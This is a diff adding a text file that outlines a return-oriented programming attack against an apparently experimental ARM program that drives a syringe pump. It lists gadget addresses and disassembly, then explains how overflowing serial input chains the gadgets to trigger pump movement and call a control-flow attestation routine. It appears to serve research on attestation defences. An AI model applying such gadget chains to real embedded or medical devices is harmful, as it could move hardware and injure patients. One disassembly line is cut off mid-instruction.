@@ -1,0 +1,59 @@
+Attack goal: hijack control flow to trigger the movement of the syringe
+pump.
+
+What we need to accomplish with a gadget chain:
+- write an argument of syringe-move function on r0
+- branch to syringe-move function
+- write argumenets of cfa_quote on r0, r1, r2, r3
+- branch to cfa_quote
+
+Required gadgets:
+Gadget1: load r3 from the stack and branches to Gadget2
+00008208 LDMFD           SP!, {R3,R4,R11,PC}
+
+Gadget2: Move value in register r3 to r0 and branches to move-syringe
+00009C40 MOV             R0, R3
+00009C44 SUB             SP, R11, #4
+00009C48 LDMFD           SP!, {R11,LR}
+00009C4C ADD             SP, SP, #0x10
+00009C50 BX              LR
+
+Gadget3: load r0, r1, r2, r3 and calls cfa_quote
+000082A0 LDR             R3, =(user_data - 0x82AC)
+000082A4 ADD             R3, PC, R3 ; user_data
+000082A8 MOV             R0, R3
+000082AC MOV             R1, #8
+000082B0 LDR             R3, =(quote_out - 0x82BC)
+000082B4 ADD             R3, PC, R3 ; quote_out
+000082B8 MOV             R2, R3
+000082BC LDR             R3, =(quote_len - 0x82C8)
+000082C0 ADD             R3, PC, R3 ; quote_len
+000082C4 BL              cfa_quote
+000082C8 SUB             SP, R11, #8
+000082CC LDMFD           SP!, {R4,R
+
+The steps of the attack are as following:
+1. The program reads serial data and we provide the chain of gadgets as
+input 2. The return address of the vulnerable function is overwritten by the
+address of Gadget1. When the function returns, control flow is redirected to
+Gadget1 3. Gadget1 loads registers r3 and pc with values from the stack and
+control flows to Gadget2.
+       move r3 <-- [argument value]
+       move pc <-- [address of Gadget2]
+       branch to pc
+
+3. Gadget 2 moves the value in r3 to r0, loads lr from stack and branches to
+move-syringe
+       move r0 <-- r3
+       move lr <-- [address of move syringe function + 4], avoid the first
+instruction that stores lr
+       branch to lr
+
+4. The function move-syringe ends with instruction: LDMFD     SP!, 
+{R4,R11,PC}. Control flows to Gadget3
+         move pc <-- [address of Gadget3]
+
+5. Gadget3 loads the arguments of cfa_quote on r0, r1, r2, and r3 and calls
+cfa_quote The attack ends by outputting the hash value of the control flow.
+
+6. Execution may continue depending on the values on the stack.
